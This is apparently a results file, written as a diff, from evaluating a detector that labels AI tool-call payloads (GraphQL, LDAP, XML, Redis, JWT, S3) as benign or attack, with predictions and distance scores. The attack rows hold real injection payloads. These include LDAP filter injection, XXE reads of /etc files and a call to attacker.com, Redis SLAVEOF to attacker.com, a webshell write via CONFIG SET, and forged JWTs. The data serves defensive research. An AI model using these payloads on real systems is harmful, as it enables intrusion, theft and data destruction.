@@ -1,0 +1,305 @@
+tool_name,payload,true_label,pred_label,confidence,dist_benign,dist_attack
+graphql_query,"{""query"": ""query { user(id: 4) { name email } }""}",benign,benign,0.95,2.268599271774292,1670.974609375
+graphql_query,"{""query"": ""query { searchProducts(query: \""laptop\"") { id name } }""}",benign,attack,0.95,1061.17724609375,1035.9254150390625
+graphql_query,"{""query"": ""query { order(id: 22) { total status } }""}",benign,attack,0.95,587.8112182617188,1719.52685546875
+graphql_query,"{""query"": ""mutation { updateItem(id: 6, status: \""active\"") { id } }""}",benign,attack,0.95,1137.6268310546875,901.864990234375
+graphql_query,"{""query"": ""query { user(id: 18) { name email } }""}",benign,attack,0.95,278.28900146484375,2028.0155029296875
+graphql_query,"{""query"": ""query { user(id: 0) { name email } }""}",benign,benign,0.95,2.268599271774292,1670.974609375
+graphql_query,"{""query"": ""query { product(id: 34) { name price } }""}",benign,attack,0.95,629.0958862304688,1885.6748046875
+graphql_query,"{""query"": ""query { products(first: 10) { edges { node { name price } } } }""}",benign,attack,0.95,2206.96337890625,1416.43603515625
+graphql_query,"{""query"": ""query { product(id: 8) { name price } }""}",benign,attack,0.95,462.7585144042969,1452.90185546875
+graphql_query,"{""query"": ""{ __typename }""}",benign,attack,0.95,5141.3779296875,2658.709228515625
+graphql_query,"{""query"": ""mutation { updateItem(id: 24, status: \""active\"") { id } }""}",benign,attack,0.95,1285.4835205078125,1257.8443603515625
+graphql_query,"{""query"": ""query { product(id: 14) { name price } }"", ""variables"": {""id"": ""123""}",benign,attack,0.95,2005.75537109375,2373.442138671875
+graphql_query,"{""query"": ""mutation { createPost(title: \""Test\"") { id } }""}",benign,benign,0.95,2.24246883392334,794.3243408203125
+graphql_query,"{""query"": ""query { me { id name email } }""}",benign,attack,0.95,1064.6409912109375,1684.1678466796875
+graphql_query,"{""query"": ""query { categories { id name products { name } } }""}",benign,attack,0.95,1142.1427001953125,632.8203735351562
+graphql_query,"{""query"": ""query { comments(postId: 20) { id text } }""}",benign,attack,0.95,832.5197143554688,1779.6634521484375
+graphql_query,"{""query"": ""query { user(id: 1) { name email } }""}",benign,benign,0.95,2.268599271774292,1670.974609375
+graphql_query,"{""query"": ""query { user(id: 32) { name email } }""}",benign,attack,0.95,278.28900146484375,2028.0155029296875
+graphql_query,"{""query"": ""query { posts(first: 15) { edges { node { title } } } }"", ""variables""",benign,attack,0.95,2746.52880859375,1968.0343017578125
+graphql_query,"{""query"": ""mutation { updateItem(id: 16, status: \""active\"") { id } }""}",benign,attack,0.95,1285.4835205078125,1257.8443603515625
+graphql_query,"{""query"": ""mutation { createPost(title: \""Hello\"") { id } }""}",benign,attack,0.95,194.95541381835938,739.2586059570312
+graphql_query,"{""query"": ""query GetUser($id: ID!) { user(id: $id) { name } }"", ""variables"": {""i",benign,attack,0.95,2518.414794921875,942.5673828125
+graphql_query,"{""query"": ""query { product(id: 36) { name price } }""}",benign,attack,0.95,629.0958862304688,1885.6748046875
+graphql_query,"{""query"": ""query { comments(postId: 30) { id text } }""}",benign,attack,0.95,832.5197143554688,1779.6634521484375
+graphql_query,"{""query"": ""query { comments(postId: 26) { id text } }""}",benign,attack,0.95,832.5197143554688,1779.6634521484375
+graphql_query,"{""query"": ""query { user(id: 2) { name email } }"", ""variables"": {""id"": ""123""}}",benign,attack,0.95,1617.0645751953125,1801.7008056640625
+graphql_query,"{""query"": ""mutation { updateItem(id: 12, status: \""active\"") { id } }""}",benign,attack,0.95,1285.4835205078125,1257.8443603515625
+graphql_query,"{""query"": ""mutation { updateUser(id: 1, name: \""John\"") { id } }""}",benign,attack,0.95,1067.7249755859375,1113.09619140625
+graphql_query,"{""query"": ""query { orders(status: PENDING) { id total } }""}",benign,attack,0.95,3207.07177734375,1342.6361083984375
+graphql_query,"{""query"": ""query { order(id: 28) { total status } }""}",benign,attack,0.95,599.12890625,1766.457275390625
+graphql_query,"{""query"": ""query { users { email passwordHash } }""}",attack,attack,0.95,1512.1614990234375,2.2618372440338135
+graphql_query,"{""query"": ""query { users(first: 999999999) { edges { node { id } } } }""}",attack,attack,0.95,2320.82666015625,4551.56396484375
+graphql_query,"{""query"": ""{\""query\"": \""query { user(id: \\\""1 OR 1=1\\\"") { name } }\""}""}",attack,attack,0.95,1814.8570556640625,2679.6845703125
+graphql_query,"{""query"": ""query { auditLogs { action userId ipAddress } }""}",attack,attack,0.95,1664.057373046875,2.268467903137207
+graphql_query,"{""query"": ""mutation { deleteAllUsers { count } }""}",attack,attack,0.95,1035.393798828125,2.257371187210083
+graphql_query,"{""query"": ""query { __schema { types { name fields { name } } } }""}",attack,attack,0.95,1689.496826171875,946.7310791015625
+graphql_query,"{""query"": ""query { __type(name: \""User\"") { fields { name type { name } } } }""}",attack,attack,0.95,2052.569580078125,902.8670043945312
+graphql_query,"{""query"": ""query { admin { apiKey secretToken } }""}",attack,attack,0.95,2766.590576171875,2.26347017288208
+graphql_query,"{""query"": ""query x($id: String!) { user(id: $id) { name } }"", ""variables"": {""id""",attack,attack,0.95,4587.4697265625,2.378303289413452
+graphql_query,"{""query"": ""query { a]};alert(1)// }""}",attack,attack,0.95,5193.9033203125,2.3939499855041504
+ldap_query,"{""filter"": ""(cn=User 18)"", ""base"": ""ou=users,dc=example,dc=com""}",benign,attack,0.95,397.5939025878906,1663.8865966796875
+ldap_query,"{""filter"": ""(objectClass=person)"", ""base"": ""dc=example,dc=com""}",benign,attack,0.95,1311.3636474609375,28.537723541259766
+ldap_query,"{""filter"": ""(uid=user14)"", ""base"": ""ou=people,dc=company,dc=org""}",benign,attack,0.95,258.98876953125,1627.899169921875
+ldap_query,"{""filter"": ""(title=Engineer)"", ""base"": ""ou=employees,dc=corp,dc=net""}",benign,benign,0.95,2.481635332107544,131.73928833007812
+ldap_query,"{""filter"": ""(mail=user12@example.com)"", ""base"": ""ou=people,dc=company,dc=org""}",benign,attack,0.95,1024.297607421875,1362.82958984375
+ldap_query,"{""filter"": ""(sn=Smith)"", ""base"": ""ou=people,dc=company,dc=org""}",benign,attack,0.95,978.0401611328125,155.4827423095703
+ldap_query,"{""filter"": ""(&(department=IT)(active=true))"", ""base"": ""ou=employees,dc=corp,dc=n",benign,attack,0.95,729.044677734375,239.16795349121094
+ldap_query,"{""filter"": ""(&(department=dept0)(active=true))"", ""base"": ""ou=users,dc=example,dc",benign,attack,0.95,116.44187927246094,620.763671875
+ldap_query,"{""filter"": ""(telephoneNumber=*)"", ""base"": ""ou=contacts,dc=example,dc=com""}",benign,attack,0.95,2185.039306640625,13.6841459274292
+ldap_query,"{""filter"": ""(mail=user34@example.com)"", ""base"": ""ou=people,dc=company,dc=org""}",benign,attack,0.95,1024.297607421875,1362.82958984375
+ldap_query,"{""filter"": ""(&(department=dept4)(active=true))"", ""base"": ""ou=users,dc=example,dc",benign,attack,0.95,116.44187927246094,620.763671875
+ldap_query,"{""filter"": ""(cn=John Doe)"", ""base"": ""ou=contacts,dc=example,dc=com""}",benign,benign,0.95,2.499818801879883,81.63475036621094
+ldap_query,"{""filter"": ""(cn=User 28)"", ""base"": ""ou=users,dc=example,dc=com""}",benign,attack,0.95,397.5939025878906,1663.8865966796875
+ldap_query,"{""filter"": ""(uid=john)"", ""base"": ""ou=users,dc=example,dc=com""}",benign,attack,0.95,1115.85205078125,35.353633880615234
+ldap_query,"{""filter"": ""(mail=user6@example.com)"", ""base"": ""ou=employees,dc=corp,dc=net""}",benign,attack,0.95,415.3143005371094,692.1309814453125
+ldap_query,"{""filter"": ""(employeeNumber=2)"", ""base"": ""ou=employees,dc=corp,dc=net""}",benign,attack,0.95,2113.78369140625,744.9140625
+ldap_query,"{""filter"": ""(uid=user36)"", ""base"": ""ou=people,dc=company,dc=org""}",benign,attack,0.95,258.98876953125,1627.899169921875
+ldap_query,"{""filter"": ""(mail=user16@example.com)"", ""base"": ""ou=people,dc=company,dc=org""}",benign,attack,0.95,1024.297607421875,1362.82958984375
+ldap_query,"{""filter"": ""(employeeNumber=20)"", ""base"": ""ou=employees,dc=corp,dc=net""}",benign,attack,0.95,2210.318115234375,1468.864990234375
+ldap_query,"{""filter"": ""(employeeNumber=22)"", ""base"": ""ou=employees,dc=corp,dc=net""}",benign,attack,0.95,2210.3046875,1468.87939453125
+ldap_query,"{""filter"": ""(mail=user32@example.com)"", ""base"": ""ou=users,dc=example,dc=com""}",benign,attack,0.95,921.25927734375,1379.7193603515625
+ldap_query,"{""filter"": ""(&(department=dept0)(active=true))"", ""base"": ""ou=employees,dc=corp,d",benign,benign,0.95,2.4867947101593018,614.2816772460938
+ldap_query,"{""filter"": ""(&(department=dept6)(active=true))"", ""base"": ""ou=employees,dc=corp,d",benign,benign,0.95,2.4867947101593018,614.2816772460938
+ldap_query,"{""filter"": ""(mail=*@example.com)"", ""base"": ""ou=users,dc=example,dc=com""}",benign,attack,0.95,939.8021240234375,110.96736145019531
+ldap_query,"{""filter"": ""(employeeNumber=0)"", ""base"": ""ou=users,dc=example,dc=com""}",benign,attack,0.95,2182.35009765625,755.458984375
+ldap_query,"{""filter"": ""(uid=user8)"", ""base"": ""ou=employees,dc=corp,dc=net""}",benign,attack,0.95,971.6924438476562,826.2315063476562
+ldap_query,"{""filter"": ""(employeeNumber=24)"", ""base"": ""ou=people,dc=company,dc=org""}",benign,attack,0.95,2210.359375,1468.849365234375
+ldap_query,"{""filter"": ""\\00*)(uid=admin"", ""base"": ""ou=users,dc=example,dc=com""}",attack,attack,0.95,1330.4720458984375,1556.2288818359375
+ldap_query,"{""filter"": ""(uid=admin)"", ""base"": ""ou=admins,dc=corp,dc=net""}",attack,attack,0.95,3092.005615234375,2.478633165359497
+ldap_query,"{""filter"": ""(objectClass=*)"", ""base"": ""cn=admin,dc=example,dc=com""}",attack,attack,0.95,1581.977294921875,44.840431213378906
+ldap_query,"{""filter"": ""*)(|(objectClass=*))"", ""base"": ""dc=corp,dc=net""}",attack,attack,0.95,3782.631103515625,2.4787757396698
+ldap_query,"{""filter"": ""(memberOf=cn=Domain Admins)"", ""base"": ""dc=example,dc=com""}",attack,attack,0.95,904.0820922851562,2.489974021911621
+ldap_query,"{""filter"": ""admin)(|(password=*)"", ""base"": ""ou=users,dc=example,dc=com""}",attack,attack,0.95,2963.3583984375,21.127986907958984
+ldap_query,"{""filter"": ""*)(objectClass=*"", ""base"": ""dc=example,dc=com""}",attack,attack,0.95,2290.386474609375,2.4650676250457764
+ldap_query,"{""filter"": "")(cn=*)(|(cn=*"", ""base"": ""dc=corp,dc=net""}",attack,attack,0.95,5188.84326171875,57.322261810302734
+ldap_query,"{""filter"": ""*)(uid=*))(|(uid=*"", ""base"": ""dc=example,dc=com""}",attack,attack,0.95,4418.79931640625,2.5191240310668945
+parse_xml,"{""xml"": ""<config><item id=\""18\"">value</item></config>""}",benign,benign,0.95,1.480164885520935,1168.535888671875
+parse_xml,"{""xml"": ""<?xml version=\""1.0\""?><data><id>12</id></data>""}",benign,attack,0.95,1240.321044921875,2034.4422607421875
+parse_xml,"{""xml"": ""<users><user id=\""1\""><name>John</name></user></users>""}",benign,attack,0.95,836.642578125,1433.7064208984375
+parse_xml,"{""xml"": ""<?xml version=\""1.0\""?><data><id>2</id></data>""}",benign,attack,0.95,1226.4002685546875,2027.5755615234375
+parse_xml,"{""xml"": ""<users><user id=\""10\""><name>User10</name></user></users>""}",benign,benign,0.95,2.265624523162842,1617.4007568359375
+parse_xml,"{""xml"": ""<response code=\""200\""><message>OK 22</message></response>""}",benign,attack,0.95,954.5631103515625,2271.981689453125
+parse_xml,"{""xml"": ""<order id=\""8\""><status>pending</status></order>""}",benign,attack,0.95,347.1366882324219,1090.453369140625
+parse_xml,"{""xml"": ""<response code=\""200\""><message>OK 28</message></response>""}",benign,attack,0.95,911.3790893554688,2224.593994140625
+parse_xml,"{""xml"": ""<note><to>User</to><from>Admin</from><body>Hello</body></note>""}",benign,attack,0.95,1680.483154296875,2387.0322265625
+parse_xml,"{""xml"": ""<order id=\""24\""><status>pending</status></order>""}",benign,attack,0.95,341.27264404296875,1185.35791015625
+parse_xml,"{""xml"": ""<feed><entry><title>Hello</title></entry></feed>""}",benign,attack,0.95,590.330810546875,1588.904052734375
+parse_xml,"{""xml"": ""<order><id>123</id><items><item>Book</item></items></order>""}",benign,attack,0.95,817.5947875976562,2482.157958984375
+parse_xml,"{""xml"": ""<?xml version=\""1.0\""?><data><item>test</item></data>""}",benign,attack,0.95,667.9400634765625,1317.7093505859375
+parse_xml,"{""xml"": ""<users><user id=\""16\""><name>User16</name></user></users>""}",benign,benign,0.95,2.265624523162842,1617.4007568359375
+parse_xml,"{""xml"": ""<config><item id=\""30\"">value</item></config>""}",benign,benign,0.95,1.480164885520935,1168.535888671875
+parse_xml,"{""xml"": ""<users><user id=\""26\""><name>User26</name></user></users>""}",benign,benign,0.95,2.265624523162842,1617.4007568359375
+parse_xml,"{""xml"": ""<products><product><name>Widget</name><price>9.99</price></product></pr",benign,attack,0.95,1256.9072265625,1491.930908203125
+parse_xml,"{""xml"": ""<config><item id=\""0\"">value</item></config>""}",benign,attack,0.95,4.162620544433594,1044.5487060546875
+parse_xml,"{""xml"": ""<config><item id=\""6\"">value</item></config>""}",benign,attack,0.95,4.162620544433594,1044.5487060546875
+parse_xml,"{""xml"": ""<response status=\""ok\""><message>Success</message></response>""}",benign,benign,0.95,2.257572889328003,918.5855712890625
+parse_xml,"{""xml"": ""<config><setting name=\""debug\"">false</setting></config>""}",benign,attack,0.95,497.3455505371094,608.4082641601562
+parse_xml,"{""xml"": ""<?xml version=\""1.0\""?><data><id>4</id></data>""}",benign,attack,0.95,1226.4002685546875,2027.5755615234375
+parse_xml,"{""xml"": ""<config><item id=\""20\"">value</item></config>""}",benign,benign,0.95,1.480164885520935,1168.535888671875
+parse_xml,"{""xml"": ""<response code=\""200\""><message>OK 14</message></response>""}",benign,attack,0.95,883.2235107421875,2190.219482421875
+parse_xml,"{""xml"": ""<?xml version=\""1.0\""?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM 'file:///et",attack,attack,0.95,4199.337890625,2.2683417797088623
+parse_xml,"{""xml"": ""<?xml version=\""1.0\""?><!DOCTYPE data [<!ENTITY xxe SYSTEM 'http://169.",attack,attack,0.95,2890.42431640625,1559.090087890625
+parse_xml,"{""xml"": ""<!DOCTYPE test [<!ENTITY xxe SYSTEM 'php://filter/convert.base64-encode",attack,attack,0.95,3740.36279296875,1112.3013916015625
+parse_xml,"{""xml"": ""<credentials><username>admin</username><password>secret</password></cre",attack,attack,0.95,2113.8427734375,2.2800116539001465
+parse_xml,"{""xml"": ""<config><apiKey>sk-xxx</apiKey></config>""}",attack,attack,0.95,615.9918823242188,2.2687582969665527
+parse_xml,"{""xml"": ""<?xml version=\""1.0\""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/",attack,attack,0.95,3608.88232421875,2.274533987045288
+parse_xml,"{""xml"": ""<!DOCTYPE :[ <!ENTITY x SYSTEM \""file:///dev/random\""> ]><x>&x;</x>""}",attack,attack,0.95,3666.527587890625,779.7528686523438
+parse_xml,"{""xml"": ""<!DOCTYPE root [<!ENTITY % dtd SYSTEM 'http://attacker.com/evil.dtd'>%d",attack,attack,0.95,4070.08056640625,2.2652440071105957
+redis_command,"{""command"": ""GET"", ""args"": [""session:18""]}",benign,benign,0.95,2.2674052715301514,1934.1878662109375
+redis_command,"{""command"": ""GET"", ""args"": [""session:22""]}",benign,attack,0.95,221.08804321289062,2108.029541015625
+redis_command,"{""command"": ""HGET"", ""args"": [""user:28"", ""name""]}",benign,attack,0.95,386.8968811035156,1287.6253662109375
+redis_command,"{""command"": ""HSET"", ""args"": [""user:1"", ""email"", ""john@example.com""]}",benign,attack,0.95,1557.0770263671875,1356.499267578125
+redis_command,"{""command"": ""EXPIRE"", ""args"": [""temp:14"", ""3600""]}",benign,attack,0.95,621.6923217773438,866.0059204101562
+redis_command,"{""command"": ""HGET"", ""args"": [""user:6"", ""name""]}",benign,attack,0.95,432.44439697265625,1323.09130859375
+redis_command,"{""command"": ""INCR"", ""args"": [""counter""]}",benign,attack,0.95,745.6119384765625,1748.0030517578125
+redis_command,"{""command"": ""INCR"", ""args"": [""counter:38""]}",benign,attack,0.95,666.2655639648438,1524.7840576171875
+redis_command,"{""command"": ""SADD"", ""args"": [""tags"", ""python""]}",benign,benign,0.95,2.262545585632324,1472.9090576171875
+redis_command,"{""command"": ""ZADD"", ""args"": [""leaderboard"", ""100"", ""user1""]}",benign,attack,0.95,2148.982666015625,1710.576171875
+redis_command,"{""command"": ""LPUSH"", ""args"": [""queue:0"", ""task0""]}",benign,attack,0.95,385.37200927734375,842.16845703125
+redis_command,"{""command"": ""HGET"", ""args"": [""user:10"", ""name""]}",benign,attack,0.95,386.8968811035156,1287.6253662109375
+redis_command,"{""command"": ""LPUSH"", ""args"": [""queue"", ""task1""]}",benign,attack,0.95,464.9886779785156,816.2992553710938
+redis_command,"{""command"": ""HGET"", ""args"": [""user:1"", ""name""]}",benign,attack,0.95,432.44439697265625,1323.09130859375
+redis_command,"{""command"": ""SET"", ""args"": [""cache:page"", ""data""]}",benign,attack,0.95,99.33757781982422,2211.063720703125
+redis_command,"{""command"": ""GET"", ""args"": [""session:123""]}",benign,attack,0.95,245.9800262451172,1880.308837890625
+redis_command,"{""command"": ""GET"", ""args"": [""session:2""]}",benign,attack,0.95,258.54815673828125,1987.561767578125
+redis_command,"{""command"": ""INCR"", ""args"": [""counter:20""]}",benign,attack,0.95,666.2655639648438,1524.7840576171875
+redis_command,"{""command"": ""SET"", ""args"": [""cache:page:36"", ""data""]}",benign,attack,0.95,202.0568389892578,2017.3511962890625
+redis_command,"{""command"": ""INCR"", ""args"": [""counter:30""]}",benign,attack,0.95,666.2655639648438,1524.7840576171875
+redis_command,"{""command"": ""INCR"", ""args"": [""counter:32""]}",benign,attack,0.95,666.2655639648438,1524.7840576171875
+redis_command,"{""command"": ""SET"", ""args"": [""cache:page:4"", ""data""]}",benign,benign,0.95,2.2587337493896484,2081.426025390625
+redis_command,"{""command"": ""LPUSH"", ""args"": [""queue:3"", ""task8""]}",benign,attack,0.95,563.9107666015625,682.3204345703125
+redis_command,"{""command"": ""LPUSH"", ""args"": [""queue:1"", ""task26""]}",benign,attack,0.95,550.3413696289062,637.5001220703125
+redis_command,"{""command"": ""INCR"", ""args"": [""counter:12""]}",benign,attack,0.95,666.2655639648438,1524.7840576171875
+redis_command,"{""command"": ""INCR"", ""args"": [""counter:24""]}",benign,attack,0.95,666.2655639648438,1524.7840576171875
+redis_command,"{""command"": ""TTL"", ""args"": [""session:123""]}",benign,attack,0.95,335.9097595214844,2053.006591796875
+redis_command,"{""command"": ""EXPIRE"", ""args"": [""temp:16"", ""3600""]}",benign,attack,0.95,804.7140502929688,1026.984375
+redis_command,"{""command"": ""EXPIRE"", ""args"": [""cache:key"", ""3600""]}",benign,benign,0.95,2.27276611328125,937.708251953125
+redis_command,"{""command"": ""GET"", ""args"": [""session:34""]}",benign,benign,0.95,2.2674052715301514,1934.1878662109375
+redis_command,"{""command"": ""DEBUG"", ""args"": [""SEGFAULT""]}",attack,attack,0.95,2835.64453125,2.2708041667938232
+redis_command,"{""command"": ""KEYS"", ""args"": [""*""]}",attack,attack,0.95,1602.725830078125,2.2238664627075195
+redis_command,"{""command"": ""EVAL"", ""args"": [""return os.execute('id')"", ""0""]}",attack,attack,0.95,4231.0693359375,2.2851829528808594
+redis_command,"{""command"": ""MODULE"", ""args"": [""LOAD"", ""/tmp/malicious.so""]}",attack,attack,0.95,14285714432.0,14285714432.0
+redis_command,"{""command"": ""CONFIG"", ""args"": [""GET"", ""requirepass""]}",attack,attack,0.95,2319.295166015625,2.2639870643615723
+redis_command,"{""command"": ""FLUSHALL"", ""args"": []}",attack,attack,0.95,1565.814208984375,2.296149730682373
+redis_command,"{""command"": ""SLAVEOF"", ""args"": [""attacker.com"", ""6379""]}",attack,attack,0.95,917.6531372070312,689.484130859375
+redis_command,"{""command"": ""INFO"", ""args"": []}",attack,attack,0.95,803.813232421875,220.32711791992188
+redis_command,"{""command"": ""CONFIG"", ""args"": [""SET"", ""dir"", ""/var/www/html""]}",attack,attack,0.95,13888889856.0,13888889856.0
+redis_command,"{""command"": ""CONFIG"", ""args"": [""SET"", ""dbfilename"", ""shell.php""]}",attack,attack,0.95,2260.8291015625,2.3038506507873535
+verify_jwt,"{""token"": ""eyJhbGciOiJIUzM4NCIsInR5cCI6IkpXVCJ9.eyJkYXRhIjoidGVzdCJ9.sig""}",benign,attack,0.95,1096.7169189453125,2337.771484375
+verify_jwt,"{""token"": ""eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXyIgfQ.signature",benign,benign,0.95,1.9351447820663452,648.8156127929688
+verify_jwt,"{""token"": ""eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXyIgfQ.signature",benign,benign,0.95,1.9389532804489136,1002.8255615234375
+verify_jwt,"{""token"": ""eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXyIgfQ.signature",benign,benign,0.95,2.8394224643707275,698.7009887695312
+verify_jwt,"{""token"": ""eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiSmFuZSJ9.sig""}",benign,attack,0.95,917.3439331054688,1787.7939453125
+verify_jwt,"{""token"": ""eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXyIgfQ.signature",benign,attack,0.95,5.654775142669678,767.9534912109375
+verify_jwt,"{""token"": ""eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXyIgfQ.signature",benign,attack,0.95,6.8943939208984375,881.4966430664062
+verify_jwt,"{""token"": ""eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXyIgfQ.signature",benign,attack,0.95,6.8100762367248535,795.6563110351562
+verify_jwt,"{""token"": ""eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXyIgfQ.signature",benign,attack,0.95,5.654775142669678,767.9534912109375
+verify_jwt,"{""token"": ""eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXyIgfQ.signature",benign,attack,0.95,9.936667442321777,872.3638916015625
+verify_jwt,"{""token"": ""eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoxMjN9.sig""}",benign,attack,0.95,2526.19482421875,573.44921875
+verify_jwt,"{""token"": ""eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJhcHAiLCJzdWIiOiJ1c2Vy",benign,attack,0.95,1109.3338623046875,2032.669921875
+verify_jwt,"{""token"": ""eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXyIgfQ.signature",benign,attack,0.95,6.8100762367248535,795.6563110351562
+verify_jwt,"{""token"": ""eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXyIgfQ.signature",benign,attack,0.95,3.8744313716888428,933.0963745117188
+verify_jwt,"{""token"": ""eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXyIgfQ.signature",benign,attack,0.95,3.8744313716888428,933.0963745117188
+verify_jwt,"{""token"": ""eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXyIgfQ.signature",benign,attack,0.95,5.654775142669678,767.9534912109375
+verify_jwt,"{""token"": ""eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFt",benign,attack,0.95,3094.7744140625,800.6242065429688
+verify_jwt,"{""token"": ""eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXyIgfQ.signature",benign,attack,0.95,8.749449729919434,842.8974609375
+verify_jwt,"{""token"": ""eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXyIgfQ.signature",benign,attack,0.95,6.8943939208984375,881.4966430664062
+verify_jwt,"{""token"": ""eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXyIgfQ.signature",benign,attack,0.95,3.3545117378234863,712.229736328125
+verify_jwt,"{""token"": ""eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXyIgfQ.signature",benign,attack,0.95,9.936667442321777,872.3638916015625
+verify_jwt,"{""token"": ""eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6Inwgc2xlZXAgMTAgfCJ9.eyJy",attack,attack,0.95,2406.57421875,975.5858764648438
+verify_jwt,"{""token"": ""eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4ifQ.sig"", ""ke",attack,attack,0.95,17391304704.0,17391304704.0
+verify_jwt,"{""token"": ""eyJhbGciOiJIUzI1NiJ9.eyJhcGlfa2V5IjoieHh4In0.sig""}",attack,attack,0.95,2379.866455078125,224.51707458496094
+verify_jwt,"{""token"": ""eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJyb2xlIjoiYWRtaW4ifQ.""}",attack,attack,0.95,2158.622314453125,2.0307071208953857
+verify_jwt,"{""token"": ""eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImp3ayI6eyJrdHkiOiJvY3QiLCJrIjoiY",attack,attack,0.95,3581.12158203125,1.9051719903945923
+verify_jwt,"{""token"": ""eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ii4uLy4uLy4uL2V0Yy9wYXNzd",attack,attack,0.95,2847.180908203125,370.54083251953125
+verify_jwt,"{""token"": ""eyJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiYWRtaW4ifQ.secret""}",attack,attack,0.95,3759.20654296875,2.0521767139434814
+s3_operation,"{""operation"": ""list"", ""bucket"": ""assets"", ""prefix"": ""images/18/""}",benign,attack,0.95,427.0628967285156,1392.6343994140625
+s3_operation,"{""operation"": ""head"", ""bucket"": ""data"", ""key"": ""reports/report10.csv""}",benign,attack,0.95,599.6061401367188,1318.1085205078125
+s3_operation,"{""operation"": ""list"", ""bucket"": ""assets"", ""prefix"": ""images/""}",benign,attack,0.95,2089.5966796875,515.608154296875
+s3_operation,"{""operation"": ""list"", ""bucket"": ""assets"", ""prefix"": ""images/2/""}",benign,attack,0.95,649.5726318359375,1572.6197509765625
+s3_operation,"{""operation"": ""put"", ""bucket"": ""uploads"", ""key"": ""user24/file.txt""}",benign,benign,0.95,2.268193006515503,1451.6279296875
+s3_operation,"{""operation"": ""list"", ""bucket"": ""assets"", ""prefix"": ""images/14/""}",benign,attack,0.95,427.0628967285156,1392.6343994140625
+s3_operation,"{""operation"": ""list"", ""bucket"": ""assets"", ""prefix"": ""images/8/""}",benign,attack,0.95,649.5726318359375,1572.6197509765625
+s3_operation,"{""operation"": ""list"", ""bucket"": ""logs"", ""prefix"": ""2024/01/""}",benign,attack,0.95,1356.06640625,1289.77880859375
+s3_operation,"{""operation"": ""put"", ""bucket"": ""uploads"", ""key"": ""user12/file.txt""}",benign,benign,0.95,2.268193006515503,1451.6279296875
+s3_operation,"{""operation"": ""put"", ""bucket"": ""backups"", ""key"": ""2024/backup.sql""}",benign,benign,0.95,2.267059803009033,1107.007568359375
+s3_operation,"{""operation"": ""delete"", ""bucket"": ""temp"", ""key"": ""cache/old.json""}",benign,attack,0.95,211.02015686035156,1740.2061767578125
+s3_operation,"{""operation"": ""get"", ""bucket"": ""documents"", ""key"": ""reports/annual.pdf""}",benign,attack,0.95,974.608154296875,1641.502685546875
+s3_operation,"{""operation"": ""put"", ""bucket"": ""uploads"", ""key"": ""user123/photo.jpg""}",benign,attack,0.95,404.8918151855469,1321.5333251953125
+s3_operation,"{""operation"": ""list"", ""bucket"": ""assets"", ""key"": ""cache/old.json"", ""prefix"": ""im",benign,attack,0.95,3007.49072265625,2592.43017578125
+s3_operation,"{""operation"": ""put"", ""bucket"": ""uploads"", ""prefix"": ""images/"", ""key"": ""user16/fi",benign,attack,0.95,2652.3623046875,1672.1021728515625
+s3_operation,"{""operation"": ""get"", ""bucket"": ""my-app-data"", ""key"": ""uploads/file.pdf""}",benign,attack,0.95,974.5646362304688,1517.798583984375
+s3_operation,"{""operation"": ""put"", ""bucket"": ""uploads"", ""key"": ""user0/file.txt""}",benign,attack,0.95,210.68955993652344,1600.00927734375
+s3_operation,"{""operation"": ""head"", ""bucket"": ""assets"", ""key"": ""logo.png""}",benign,attack,0.95,2518.077880859375,702.28564453125
+s3_operation,"{""operation"": ""list"", ""bucket"": ""assets"", ""key"": ""uploads/file.pdf"", ""prefix"": """,benign,attack,0.95,3141.3466796875,2625.57421875
+s3_operation,"{""operation"": ""get"", ""bucket"": ""bucket-8"", ""key"": ""files/doc28.pdf""}",benign,attack,0.95,205.14126586914062,1261.5882568359375
+s3_operation,"{""operation"": ""get"", ""bucket"": ""bucket-0"", ""key"": ""files/doc20.pdf""}",benign,attack,0.95,205.14126586914062,1261.5882568359375
+s3_operation,"{""operation"": ""head"", ""bucket"": ""data"", ""prefix"": ""images/"", ""key"": ""reports/rep",benign,attack,0.95,2742.72119140625,1898.3021240234375
